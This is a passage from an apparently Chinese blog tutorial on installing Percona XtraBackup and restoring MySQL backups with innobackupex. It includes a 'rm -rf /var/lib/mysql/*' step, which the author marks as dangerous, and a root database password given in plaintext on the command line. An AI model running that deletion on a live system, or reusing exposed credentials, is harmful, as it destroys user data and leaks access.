Errors2.4.22-1.el7.x86_64.rpm...</span></span><br><span class="line"> </span><br><span class="line">[root@jaking ~]# ls -hl</span><br><span class="line">total 7.7M</span><br><span class="line">-rw-r--r--&#xA0; 1 root root&#xA0; 38K May 13 09:36 libev-4.04-2.el6.x86_64.rpm</span><br><span class="line">-rwxr-xr-x. 1 root root&#xA0; 937 Apr 23 03:57 named.sh</span><br><span class="line">-rw-r--r--&#xA0; 1 root root 7.7M Mar 10 04:56 percona-xtrabackup-24-2.4.22-1.el7.x86_64.rpm</span><br><span class="line"></span><br><span class="line">&#x6216;&#x8005;</span><br><span class="line">[root@jaking ~]# yum install -y percona-xtrabackup #&#x5907;&#x9009;&#x65B9;&#x6848;</span><br><span class="line"></span><br><span class="line">&#x6216;&#x8005;</span><br><span class="line"></span><br><span class="line">[root@jaking ~]# rpm -ivh mysql-community-libs-compat-5.7.20-1.el7.x86_64.rpm</span><br><span class="line">[root@jaking ~]# yum install -y cmake gcc gcc-c++ libaio libaio-devel automake autoconf bzr rsync</span><br><span class="line">[root@jaking ~]# yum  install -y perl perl-devel libaio libaio-devel perl-Time-HiRes perl-DBD-MySQL  perl-Digest-MD5</span><br><span class="line">[root@jaking ~]# rpm -ivh percona-xtrabackup-24-2.4.22-1.el7.x86_64.rpm</span><br><span class="line">Preparing...&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; ################################# [100%]</span><br><span class="line">Updating / installing...</span><br><span class="line">&#xA0;&#xA0; 1:percona-xtrabackup-24-2.4.22-1.el################################# [100%]</span><br><span class="line">[root@jaking ~]# which xtrabackup</span><br><span class="line">/usr/bin/xtrabackup</span><br><span class="line">[root@jaking ~]# xtrabackup --version</span><br><span class="line">xtrabackup: recognized server arguments: --datadir=/var/lib/mysql </span><br><span class="line">xtrabackup version 2.4.22 based on MySQL server 5.7.32 Linux (x86_64) (revision id: c99a781)</span><br><span class="line"></span><br><span class="line">&#x6CE8;&#x610F;&#xFF1A;my.cnf&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x91CC;datadir&#x6307;&#x5B9A;&#x7684;MySQL&#x6570;&#x636E;&#x8DEF;&#x5F84;</span><br><span class="line"></span><br><span class="line">[root@jaking ~]#cat /etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">datadir=/var/lib/mysql</span><br><span class="line">socket=/var/lib/mysql/mysql.sock</span><br><span class="line">symbolic-links=0</span><br><span class="line"></span><br><span class="line">log-error=/var/log/mysqld.log</span><br><span class="line">pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line">skip-name-resolve</span><br><span class="line"></span><br><span class="line">[root@jaking ~]# systemctl restart mysqld</span><br></pre></td></tr></tbody></table></figure><p></p><p><span style="color:orange">fnaichu:</span><br>&#x5148;&#x5B89;&#x88C5;epel&#x6E90;<br>yum install -y epel-release</p><p>&#x5B89;&#x88C5;MySQL&#xFF0C;&#x786E;&#x4FDD;&#x81F3;&#x5C11;&#x5B89;&#x88C5;&#x6709;&#x4EE5;&#x4E0B;5&#x4E2A;&#x5305;&#xFF1A;</p><p>&#x5B89;&#x88C5;xtrabackup:<br>&#x53C2;&#x8003;&#x5B98;&#x65B9;&#x6587;&#x6863;&#xFF1A;<a href="https://docs.percona.com/percona-xtrabackup/2.4/installation/yum_repo.html" target="_blank" rel="noopener">https://docs.percona.com/percona-xtrabackup/2.4/installation/yum_repo.html</a></p><p>&#x5B89;&#x88C5;xtrabackup&#x4F9D;&#x8D56;&#x5305;<br>yum install <a href="https://repo.percona.com/yum/percona-release-latest.noarch.rpm" target="_blank" rel="noopener">https://repo.percona.com/yum/percona-release-latest.noarch.rpm</a></p><p>&#x4E0B;&#x8F7D;xtrabackup&#x5B89;&#x88C5;&#x5305;<br>wget <a href="https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.4/\" target="_blank" rel="noopener">https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.4/\</a><br>binary/redhat/7/x86_64/percona-xtrabackup-24-2.4.4-1.el7.x86_64.rpm</p><p>&#x5B89;&#x88C5;xtrabackup<br>yum localinstall percona-xtrabackup-24-2.4.4-1.el7.x86_64.rpm</p><p>3&#x3001;xtrbackup&#x4F7F;&#x7528;<br>&#x4E00;&#x822C;&#x4F7F;&#x7528;innobackupex&#x811A;&#x672C;<br>innobackupex&#x662F;perl&#x811A;&#x672C;&#x5BF9;xtrabackup&#x7684;&#x5C01;&#x88C5;&#x548C;&#x529F;&#x80FD;&#x6269;&#x5C55;</p><p>&#x5907;&#x4EFD;&#x51C6;&#x5907;&#x5DE5;&#x4F5C;&#xFF1A;<br>&#x6743;&#x9650;&#x548C;&#x8FDE;&#x63A5;<br>xtrabackup&#x9700;&#x8981;&#x8FDE;&#x63A5;&#x5230;&#x6570;&#x636E;&#x5E93;&#x548C;datadir&#x64CD;&#x4F5C;&#x6743;&#x9650;<br>xtrabackup&#x6216;&#x8005;innobackupex&#x5728;&#x4F7F;&#x7528;&#x8FC7;&#x7A0B;&#x4E2D;&#x6D89;&#x53CA;&#x5230;&#x4E24;&#x7C7B;&#x7528;&#x6237;&#x6743;&#x9650;</p><p>1.&#x7CFB;&#x7EDF;&#x7528;&#x6237;&#xFF0C;&#x7528;&#x6765;&#x8C03;&#x7528;innobackupex&#x6216;&#x8005;xtrabackup</p><p>2.&#x6570;&#x636E;&#x5E93;&#x7528;&#x6237;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x5185;&#x4F7F;&#x7528;&#x7684;&#x7528;&#x6237;</p><pre><code>&#x5176;&#x4ED6;&#x8FDE;&#x63A5;&#x9009;&#x9879;&#xFF1A;</code></pre><p>| &#x70B9;&#x51FB;&#x8FD9;&#x91CC; | &#x70B9;&#x51FB;&#x8FD9;&#x91CC; |<br>|    Tmpion<br>    |    Description<br>    |<br>|   &#x2013;port<br>   |   The port to use when connecting to the database   server with TCP/IP.<br>   |<br>|   &#x2013;socket<br>   |   The socket to use when   connecting to the local database.<br>   |<br>|   &#x2013;host<br>   |   The host to use when connecting   to the database server with TCP/IP.<br>   |</p><p>&#x53EF;&#x4EE5;&#x5355;&#x72EC;&#x521B;&#x5EFA;&#x7528;&#x6765;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7528;&#x6237;&#xFF0C;&#x5B89;&#x5168;&#xFF0C;&#x5E76;&#x8D4B;&#x4E88;&#x5BF9;&#x5E94;&#x7684;&#x6743;&#x9650;</p><p>4&#x3001;&#x5168;&#x5907;&#x548C;&#x5168;&#x5907;&#x8FD8;&#x539F;</p><p>&#x4F7F;&#x7528;innobackupex&#x521B;&#x5EFA;&#x5168;&#x5907;</p><p>&#x521B;&#x5EFA;&#x5168;&#x5907;&#xFF1A;<br>innobackupex &#x2013;user=root <a href="mailto:--password=Jaking@vip.163.com" target="_blank" rel="noopener">--password=Jaking@vip.163.com</a> /tmp/db_backup/<br>innobackupex &#x2013;user=root <a href="mailto:--password=Jaking@vip.163.com" target="_blank" rel="noopener">--password=Jaking@vip.163.com</a> /tmp/db_backup/ &amp;&gt;&gt;/tmp/db_backup.log<br>&amp;&gt;&gt;/tmp/db_backup.log   #&#x4E0D;&#x663E;&#x793A;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#xFF0C;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x91CD;&#x5B9A;&#x5411;&#x5230;db_backup.log</p><p>[root@jaking ~]# ls /tmp<br>db_backup  db_backup.log  percona-version-check<br>[root@jaking ~]# ls /tmp/db_backup<br>2021-05-14_08-08-38<br>[root@jaking ~]# ls /tmp/db_backup/2021-05-14_08-08-38/<br>backup-my.cnf   ibdata1             sys                     xtrabackup_info<br>book1           market              testbookdb              xtrabackup_logfile<br>book2           mysql               testdb<br>ib_buffer_pool  performance_schema  xtrabackup_checkpoints </p><p>&#x5185;&#x90E8;&#x673A;&#x5236;&#xFF1A;&#x5728;&#x5907;&#x4EFD;&#x7684;&#x65F6;&#x5019;innobackupex&#x4F1A;&#x8C03;&#x7528;xtrabackup&#x6765;&#x5907;&#x4EFD;innodb&#x8868;&#xFF0C;&#x5E76;&#x590D;&#x5236;&#x6240;&#x6709;&#x7684;&#x8868;&#x5B9A;&#x4E49;&#xFF0C;&#x5176;&#x4ED6;&#x5F15;&#x64CE;&#x7684;&#x8868;(MyISAM,MERGE,CSV,ARCHIVE)<br>innobackupex&#x662F;&#x4E00;&#x4E2A;&#x5C01;&#x88C5;&#x4E86;xtrabackup&#x7684;&#x811A;&#x672C;&#xFF0C;&#x80FD;&#x540C;&#x65F6;&#x5904;&#x7406;innodb&#x548C;myisam&#xFF0C;&#x4F46;&#x5728;&#x5904;&#x7406;myisam&#x65F6;&#x9700;&#x8981;&#x52A0;&#x4E00;&#x4E2A;&#x8BFB;&#x9501;</p><p>&#x5176;&#x4ED6;&#x9009;&#x9879;:<br>&#x2013;no-timestamp&#xFF0C;&#x6307;&#x5B9A;&#x4E86;&#x8FD9;&#x4E2A;&#x9009;&#x9879;&#x5907;&#x4EFD;&#x4F1A;&#x76F4;&#x63A5;&#x5907;&#x4EFD;&#x5728;BACKUP-DIR&#xFF0C;&#x4E0D;&#x518D;&#x521B;&#x5EFA;&#x65F6;&#x95F4;&#x6233;&#x6587;&#x4EF6;&#x5939;<br>&#x2013;default-file&#xFF0C;&#x6307;&#x5B9A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x7528;&#x6765;&#x914D;&#x7F6E;innobackupex&#x7684;&#x9009;&#x9879;&#xFF0C;&#x8BE5;&#x9009;&#x9879;&#x6307;&#x5B9A;&#x4E86;&#x4ECE;&#x54EA;&#x4E2A;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;MySQL&#x914D;&#x7F6E;</p><p>innobackupex &#x2013;user=root <a href="mailto:--password=Jaking@vip.163.com" target="_blank" rel="noopener">--password=Jaking@vip.163.com</a> &#x2013;no-timestamp /tmp/db_backup/full (&#x4F7F;&#x7528;&#x2013;no-timestamp&#x65F6;&#xFF0C;&#x540E;&#x9762;&#x7684;&#x8FD9;&#x4E2A;full&#x76EE;&#x5F55;&#x5FC5;&#x987B;&#x8DDF;&#x4E0A;&#x4E14;&#x4E0D;&#x80FD;&#x63D0;&#x524D;&#x81EA;&#x5DF1;&#x5EFA;&#x7ACB;&#xFF0C;&#x5B83;&#x7531;innobackupex&#x81EA;&#x52A8;&#x5EFA;&#x7ACB;&#xFF0C;&#x5426;&#x5219;&#x53EF;&#x80FD;&#x4F1A;&#x62A5;&#x9519;innobackupex: Error: Failed to create backup directory) (Errcode: 17 - File exists)</p><p>[root@jaking ~]# innobackupex &#x2013;default-file=/etc/my.cnf &#x2013;user=root <a href="mailto:--password=Jaking@vip.163.com" target="_blank" rel="noopener">--password=Jaking@vip.163.com</a> &#x2013;no-timestamp /tmp/db_backup/full<br>[root@jaking ~]# ls /tmp/db_backup/<br>full</p><p>&#x4F7F;&#x7528;innobackupex&#x8FD8;&#x539F;&#x5907;&#x4EFD;</p><p>&#x4F7F;&#x7528;innobackupex &#x2013;copy-back &#x6765;&#x8FD8;&#x539F;&#x5907;&#x4EFD;</p><p>&#x505C;&#x6B62;MySQL&#x670D;&#x52A1;</p><p>systemctl stop mysqld</p><p>&#x5220;&#x9664;&#x6570;&#x636E;&#xFF1A;&#xFF08;&#x5371;&#x9669;&#x52A8;&#x4F5C;&#xFF09;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# systemctl stop mysqld</span><br><span class="line">[root@jaking ~]# ls /var/lib/mysql</span><br><span class="line">auto.cnf    client-cert.pem  ib_logfile0         private_key.pem  sys</span><br><span class="line">BOOK        client-key.pem   ib_logfile1         public_key.pem   testbookdb</span><br><span class="line">ca-key.pem  ib_buffer_pool   mysql               server-cert.pem</span><br><span class="line">ca.pem      ibdata1          performance_schema  server-key.pem</span><br><span class="line">[root@jaking ~]# rm -rf /var/lib/mysql/*</span><br><span class="line">[root@jaking ~]# ls /var/lib/mysql</span><br><span class="line"></span><br><span class="line">&#x8FD8;&#x539F;:</span><br><span class="line">[root@jaking ~]# innobackupex --copy-back /tmp/db_backup/full/&#xA0;</span><br><span class="line">[root@jaking ~]# ls /var/lib/mysql</span><br><span class="line">BOOK            ibdata1  performance_schema  testbookdb</span><br><span class="line">ib_buffer_pool  mysql    sys                 xtrabackup_info</span><br><span class="line"> </span><br><span class="line">&#x67E5;&#x770B;&#x6743;&#x9650;</span><br><span class="line">[root@jaking ~]# ll /var/lib/mysql</span><br><span class="line">total 12324</span><br><span class="line">drwxr-x--- 2 root root       52 Apr 23 04:53 BOOK</span><br><span class="line">-rw-r----- 1 root root      310 Apr 23 04:53 ib_buffer_pool</span><br><span class="line">-rw-r----- 1 root root 12582912 Apr 23 04:53 ibdata1</span><br><span class="line">drwxr-x--- 2 root root     4096 Apr 23 04:53 mysql</span><br><span class="line">drwxr-x--- 2 root root     8192 Apr 23 04:53 performance_schema</span><br><span class="line">drwxr-x--- 2 root root     8192 Apr 23 04:53 sys</span><br><span class="line">drwxr-x--- 2 root root       88 Apr 23 04:53 testbookdb</span><br><span class="line">-rw-r----- 1 root root      472 Apr 23 04:53 xtrabackup_info</span><br><span class="line"></span><br><span class="line">&#x91CD;&#x65B0;&#x6388;&#x6743;</span><br><span class="line">[root@jaking ~]# chown -Rf mysql:mysql /var/lib/mysql&#xA0;&#xA0; #&#x8981;&#x4E0D;&#x7136;MySQL&#x670D;&#x52A1;&#x4E0D;&#x80FD;&#x542F;&#x52A8;</span><br><span class="line">[root@jaking ~]# ll /var/lib/mysql                   </span><br><span class="line">total 12324</span><br><span class="line">drwxr-x--- 2 mysql mysql       52 Apr 23 04:53 BOOK</span><br><span class="line">-rw-r----- 1 mysql mysql      310 Apr 23 04:53 ib_buffer_pool</span><br><span class="line">-rw-r----- 1 mysql mysql 12582912 Apr 23 04:53 ibdata1</span><br><span class="line">drwxr-x--- 2 mysql mysql     4096 Apr 23 04:53 mysql</span><br><span class="line">drwxr-x--- 2 mysql mysql     8192 Apr 23 04:53 performance_schema</span><br><span class="line">drwxr-x--- 2 mysql mysql     8192 Apr 23 04:53 sys</span><br><span class="line">drwxr-x--- 2 mysql mysql       88 Apr 23 04:53 testbookdb</span><br><span class="line">-rw-r----- 1 mysql mysql      472 Apr 23 04:53 xtrabackup_info</span><br><span class="line">[root@jaking ~]# systemctl start mysqld</span><br><span class="line"></span><br><span class="line">&#x6CE8;&#xFF1A;datadir&#x5FC5;&#x987B;&#x662F;&#x4E3A;&#x7A7A;&#x7684;&#xFF0C;innobackupex &#x2013;copy-back&#x4E0D;&#x4F1A;&#x8986;&#x76D6;&#x5DF2;&#x5B58;&#x5728;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x8FD8;&#x8981;&#x6CE8;&#x610F;&#xFF0C;&#x8FD8;&#x539F;&#x65F6;&#x9700;&#x8981;&#x5148;&#x5173;&#x95ED;&#x670D;&#x52A1;&#xFF0C;&#x5982;&#x679C;&#x670D;&#x52A1;&#x662F;&#x542F;&#x52A8;&#x7684;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4E0D;&#x80FD;&#x8FD8;&#x539F;&#x5230;datadir</span><br><span class="line"></span><br><span class="line">[root@jaking ~]# ls /var/lib/mysql</span><br><span class="line">auto.cnf  mysql  performance_schema  sys</span><br><span class="line"></span><br><span class="line">[root@jaking ~]# innobackupex --copy-back /tmp/db_backup/full/</span><br><span class="line">xtrabackup: recognized server arguments: --datadir=/var/lib/mysql </span><br><span class="line">xtrabackup: recognized client arguments: </span><br><span class="line">220423 05:01:30 innobackupex: Starting the copy-back operation</span><br><span class="line"></span><br><span class="line">IMPORTANT: Please check that the copy-back run completes successfully.</span><br><span class="line">           At the end of a successful copy-back run innobackupex</span><br><span class="line">           prints &quot;completed OK!&quot;.</span><br><span class="line"></span><br><span class="line">innobackupex version 2.4.22 based on MySQL server 5.7.32 Linux (x86_64) (revision id: c99a781)</span><br><span class="line">Original data directory /var/lib/mysql is not empty!</span><br><span class="line"></span><br><span class="line">[root@jaking ~]# mysql -uroot -pJaking@vip.163.com</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 3</span><br><span class="line">Server version: 5.7.20 MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| BOOK               |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| testbookdb         |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">6 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">use</span> BOOK;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| Tables_in_BOOK |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| book           |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> book;</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">| name                    | price | pages |</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">| Linux                   |    30 |   666 |</span><br><span class="line">| Cloud Computing         |    60 |   666 |</span><br><span class="line">| Operation System        |    80 |   666 |</span><br><span class="line">| Artificial Intelligence |   166 |   666 |</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">use</span> testbookdb;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">| Tables_in_testbookdb |</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">| book1                |</span><br><span class="line">| book2                |</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> book1;</span><br><span class="line">+<span class="comment">---------+-----------------------------------+-------+-----------------------+</span></span><br><span class="line">| bTypeId | bName                             | price | publishing            |</span><br><span class="line">+<span class="comment">---------+-----------------------------------+-------+-----------------------+</span></span><br><span class="line">|       1 | &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;             |    66 | &#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       2 | &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;                    |    68 | &#x4EBA;&#x6C11;&#x90AE;&#x7535;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       3 | &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;            |    90 | &#x673A;&#x68B0;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       4 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;                   |    71 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       5 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL2&#x300B;                  |    72 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       6 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL3&#x300B;                  |    73 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       7 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL4&#x300B;                  |    74 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       8 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL5&#x300B;                  |    75 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       9 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL6&#x300B;                  |    76 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|      10 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL7&#x300B;                  |    77 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|      11 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL8&#x300B;                  |    78 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|      12 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL9&#x300B;                  |    79 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">+<span class="comment">---------+-----------------------------------+-------+-----------------------+</span></span><br><span class="line">12 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> book2;</span><br><span class="line">+<span class="comment">-----------------------------------+-------+-------+</span></span><br><span class="line">| name                              | price | pages |</span><br><span class="line">+<span class="comment">-----------------------------------+-------+-------+</span></span><br><span class="line">| &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;             |    30 |   666 |</span><br><span class="line">| &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;                    |    60 |   666 |</span><br><span class="line">| &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;            |    80 |   666 |</span><br><span class="line">| &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;                   |   166 |   666 |</span><br><span class="line">+<span class="comment">-----------------------------------+-------+-------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p>5&#xFF1A;&#x521B;&#x5EFA;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x4E0E;&#x8FD8;&#x539F;<br>&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x4F5C;&#x7528;&#xFF1A;&#x51CF;&#x5C11;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x91CD;&#x590D;&#xFF0C;&#x8282;&#x7701;&#x78C1;&#x76D8;&#x7A7A;&#x95F4;&#xFF0C;&#x7F29;&#x77ED;&#x5907;&#x4EFD;&#x65F6;&#x95F4;<br>&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x4F9D;&#x8D56;&#x4E8E;innodb&#x9875;&#x4E0A;&#x9762;&#x7684;LSN&#xFF08;log sequence number&#xFF09;&#xFF0C;&#x6BCF;&#x6B21;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4FEE;&#x6539;&#x90FD;&#x4F1A;&#x5BFC;&#x81F4;LSN&#x81EA;&#x589E;&#xFF0C;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x4F1A;&#x590D;&#x5236;&#x6307;&#x5B9A;LSN&lt;&#x65E5;&#x5FD7;&#x5E8F;&#x5217;&#x53F7;&gt;&#x4E4B;&#x540E;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x9875;</p><p>&#x521B;&#x5EFA;&#x589E;&#x91CF;&#x5907;&#x4EFD;</p><ol><li>&#x9996;&#x5148;&#x521B;&#x5EFA;&#x5168;&#x5907;<br>&#x5728;&#x521B;&#x5EFA;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x4E4B;&#x524D;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x5168;&#x5907;&#xFF0C;&#x4E0D;&#x7136;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x662F;&#x6CA1;&#x6709;&#x610F;&#x4E49;&#x7684;<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">innobackupex --user=root --password=Jaking@vip.163.com /tmp/db_backup/</span><br><span class="line">[root@jaking ~]# ls /tmp</span><br><span class="line">db_backup&#xA0; 